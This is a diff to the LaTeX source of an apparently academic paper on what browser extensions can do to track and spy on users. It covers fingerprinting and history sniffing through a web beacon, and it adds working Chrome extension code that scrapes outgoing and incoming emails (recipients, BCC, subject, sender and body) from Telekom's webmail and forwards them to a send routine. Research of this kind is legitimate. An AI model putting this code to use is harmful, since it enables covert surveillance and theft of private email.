@@ -69,7 +69,7 @@ document.body.appendChild(img);
 
 	Previously described methods for tracking a user identify him based on some data which was intentionally stored on the user's system. Those stored identifiers are vulnerable to deletion by the user. A study from 2010 showed that a browser reveals many browser- and computer-specific information to web pages \cite{Eckersley:2010:UYW:1881151.1881152}. Collection and merging these pieces of information creates a fingerprint of the user machine. Creating a second fingerprint at a later point in time and comparing it to stored fingerprints allows to track and identify the user without the need to store an identifier on his computer in beforehand. Because the same kind of information taken from different users will probably equal, it is necessary to collect as much information as possible to create a truly unique fingerprint. 
 	
-	The technique of fingerprinting is nowadays mostly used by advertising companies to get a more complete view of the user and his needs than from simple tracking, and anti-fraud systems that detect if the currently used credentials or device belong to the current user and are not stolen.
+	The technique of fingerprinting is nowadays mostly used by advertising companies to get a more complete view of the user and his needs than from simple tracking and by anti-fraud systems that detect if the currently used credentials or device belong to the current user and are not stolen.
 
 	There exists numerous scientific papers about fingerprinting from which we present a small subset of techniques with brief descriptions \cite{paulstone_historysniffing, MBYS11, Nikiforakis:2013:CME:2497621.2498133, Eckersley:2010:UYW:1881151.1881152, MS12, olejnik:hal-00747841}. 
 	
@@ -122,7 +122,7 @@ document.body.appendChild(img);
 
 	Explicitly testing if a user has visited a particular web page has the disadvantage that not all visited web pages are covered. A predefined list is necessary and often only contains popular web pages. To improve history sniffing, we use an extension to create a more complete list of the web pages that a user has visited and even capture additional information such as the time when, and the order in which different web pages were visited. For that purpose, we can either use the \textit{history} module or a content script in every web page. Each approach has its advantages and disadvantages. 
 	
-	With a content script, we can either execute the above described technique of history sniffing which uses a predefined list of web pages to explicit check, or store information such as the URL, and current time every time the content script is injected into a newly loaded web page. In in \autoref{code:webBeacon}, we have already shown a content script that exactly executes this task. Our implementation of a web beacon notifies us every time the user has opened a new web page by fetching a resource from our remote server. To get the URL of the visited web page, we can simply transfer it as parameter in the web request that fetches the resource. The disadvantage of using a content script for history sniffing is, that we can not retrieve visited web pages from before the extension's installation, or while the extension is disabled. Therefore, it is not an ideal fingerprinting technique because it has to be active for some time to be effective. But, it is a simple alternative if the \textit{history} module is not available because the extension does not have the corresponding permission.
+	With a content script, we can either execute the above described technique of history sniffing which uses a predefined list of web pages to explicit check, or store information such as the URL and the current time every time the content script is injected into a newly loaded web page. In in \autoref{code:webBeacon}, we have already shown a content script that exactly executes this task. Our implementation of a web beacon notifies us every time the user has opened a new web page by fetching a resource from our remote server. To get the URL of the visited web page, we can simply transfer it as parameter in the web request that fetches the resource. The disadvantage of using a content script for history sniffing is, that we can not retrieve visited web pages from before the extension's installation, or while the extension is disabled. Therefore, it is not an ideal fingerprinting technique because it has to be active for some time to be effective. But, it is a simple alternative if the \textit{history} module is not available because the extension does not have the corresponding permission.
 	
 	Using the history module allows us to retrieve all visited web pages at once. It provides two for us useful methods \texttt{search} and \texttt{getVisits}. The first method allows us to retrieve the URLs of all web pages the user has visited and the second one gives us detailed information about every time the user has visited a particular URL such as the concrete time, the referring web page, and how the user has entered the web page. In comparison to using a content script, the history module gives us more pieces of information and executes at once. But the browser's history is vulnerable to deletion or disabling by the user and is disabled if the user uses an incognito window.
 	
@@ -163,13 +163,15 @@ function addVisitItems(storage, isLast) {
 		\item \textbf{Email Account} 
 	\end{itemize}
 	
-\subsubsection{Read Outgoing Email}
+\subsubsection{Read Outgoing Emails}
 	
-	First, we check if the current web page is our targeted web page by checking its host name (line 1). Then, we query for the send button with a complex CSS selector and add a click event to it (line 2). If the user sends the mail by clicking the send button, we will send a message to the extension's background (line 3). The message contains the recipients (line 4), carbon copy recipients (line 5), blind carbon copy recipients (line 6), and the subject (line 7). Again, we query for each element with a complex CSS selector.
+	An extension that obtains the data of an outgoing email, retrieves the targeted values directly from the web page's DOM and is thus heavily dependent on the DOM's structure. It is not possible to implement a general extension for this task that works correctly for all online email clients. Therefore, we implemented several extensions each applicable to another client.
+	
+	For this paper, we present our implementation that is applicable to the email client of Telekom\footnote{TODO}. It uses a content script which we show in \autoref{code:readOutgoingEmailContent} and a background script which we show in \autoref{code:readOutgoingEmailBackground}. The extension needs host permissions for the client's web page or simpler for all web pages. In our content script, we begin by determining if the current web page is our targeted web page and check its host name and URL for that purpose (line 1). Then, we query for the send button with a complex CSS selector and add a click event to it (line 2). If the user sends the mail by clicking the send button, we will send a message to the extension's background (line 3). The message contains the recipients (line 4), carbon copy recipients (line 5), blind carbon copy recipients (line 6), and the subject (line 7). Again, we query for each element with a complex CSS selector.
 	
 	\begin{code}
 		\begin{lstlisting}
-if(window.location.host === 'email.t-online.de') {
+if(window.location.host === 'email.t-online.de' && window.location.href.indexOf('showWritemail') !== -1) {
 	$('div#toolbarLeft a.toolbarItem.single.normal').click(function() {
 		chrome.runtime.sendMessage({
 			'recipients': $('div#fieldTo ul li').not(':first-child').text(),
@@ -180,8 +182,8 @@ if(window.location.host === 'email.t-online.de') {
 	});
 }
 \end{lstlisting}
-		\caption{Content script to read an outgoing email at the \url{email.t-online.de} domain.}
-		\label{code:readOutgoingMailContent}
+		\caption{Content script to read an outgoing email at the Telekom's email client.}
+		\label{code:readOutgoingEmailContent}
 	\end{code}
 	
 	In our background script, we await the message from our content script (line 1). Because the email's body is not stored in the same document as the rest of the email's data but in a separate iframe element, we execute a further script in the current tab to retrieve the missing information (line 2). The script checks for the correct id of the document's body element and returns the body's visible text (line 3). We specify that our script is executed in all of the web page's frames, especially the iframe with the email's body (line 4). Because multiple instances of our script are active and each returns some value, we iterate over all returned values and determine the correct one (lines 6-7). Finally, we forward the email's content to our send method (lines 9-10) 
@@ -202,9 +204,62 @@ chrome.runtime.onMessage.addListener(function(message, sender) {
 	});
 });
 \end{lstlisting}
-		\caption{Extension code to read an outgoing mail at the \url{email.t-online.de} domain.}
-		\label{code:readOutgoingMailBackground}
+		\caption{Extension code to read an outgoing mail at the Telekom's email client.}
+		\label{code:readOutgoingEmailBackground}
 	\end{code}
+	
+\subsubsection{Read Incoming Emails}
+	
+	We also implemented an extension to read incoming emails respectively emails in the user's in-box. Again, we did not develop a general implementation because of the heavy dependency on the web page's structure. Matching to our implementation to read outgoing emails, we present our implementation that targets the email client of Telekom. For that purpose, we use a content script that is injected in all web pages and all of their frames (\autoref{code:readIncomingEmailContent}), a background script (\autoref{code:readIncomingEmailBackground}), and host permissions for all web web pages.
+	
+	In the content script implementation shown in \autoref{code:readIncomingEmailContent}, we first determine whether the current web page is the user's in-box of his email client (line 1). Then we send a message to the extension's background if the page has loaded completely (lines 2-3). The content of the message consists of the email's subject (line 4), the sender (line 5), and the receiving date (line 6). We retrieve each value using a complex CSS selector. Because the email's body is stored inside an embedded iframe and only this iframe is reloaded if the user selects another email to view, we check if our script is currently active in the aforesaid iframe (line 10). If this case applies, we send a message to the extension's background to notify it that the user has opened another email (line 11).
+	
+	\begin{code}
+		\begin{lstlisting}
+if(window.location.host === 'email.t-online.de' && window.location.href.indexOf('showReadmail') !== -1) {
+	$(document).ready(function() {
+		chrome.runtime.sendMessage({
+			'subject': $('a[name = subjectslim]').text(),
+			'from': $('button[data-iid = contactId]').attr('title'),
+			'date': $('table.messageHeaderDataTableBig td.headerDataSentDateCell').text()
+		});
+	});
+}
+if(window.location.host === 'email.t-online.de' && window.self !== window.top && window.frameElement.id === "messageBody") {
+	chrome.runtime.sendMessage({'mailOpened': true});
+}
+\end{lstlisting}	
+		\caption{Content script to read an email from the user's in-box at the Telekom's email client.}
+		\label{code:readIncomingEmailContent}
+	\end{code}
+	
+	The implementation of our background script shown in \autoref{code:readIncomingEmailBackground} is similar to the implementation to read an outgoing email shown in \autoref{code:readOutgoingEmailBackground}. Again, we begin by listening for a message from our content script (line 1). If the message indicates that the user has opened another email (line 2), we execute our content script again in the current tab (line 3). Otherwise, the message transfers the email's content except its body. To get the email's body, we inject a small code snippet into the current tab (lines 6-8). The snippet checks if it is active in the targeted iframe and returns the text of the document's body which contains the email's body (line 7). Furthermore, we execute the snippet in each frame oft the current tab, especially in the targeted iframe (line 8). Finally, we iterate over the result that each instance of the injected code snippet returns (line 10), check if the returned value contains the email's body (line 11), and forward the email's data to our send method (lines 12-13).
+	
+	\begin{code}
+		\begin{lstlisting}
+chrome.runtime.onMessage.addListener(function(message, sender) {
+	if(message.mailOpened) {
+		chrome.tabs.executeScript(sender.tab.id, { 'file': 'content.js'});
+	}
+	else {
+		chrome.tabs.executeScript(sender.tab.id, {
+			'code': 'window.frameElement && window.frameElement.id === "messageBody" ? {"body": document.body.innerText} : null',
+			'allFrames': true
+		}, function(results) {
+			for(var i = 0; i < results.length; i++) {
+				if(results[i] && results[i].body) {
+					message.body = results[i].body;
+					send(message);
+				}
+			}
+		});
+	}
+});
+\end{lstlisting}
+		\caption{Extension code to read  an email from the user's in-box at the Telekom's email client.}
+		\label{code:readIncomingEmailBackground}
+	\end{code}
+	
 	
 	
 	% social media -> name, address, phone number, friends, company
@@ -244,7 +299,7 @@ chrome.runtime.onMessage.addListener(function(message, sender) {
 	
 	
 	
-\newpage	
+\newpage
 \section{Fetching}
 \label{sec:fetching}
 	
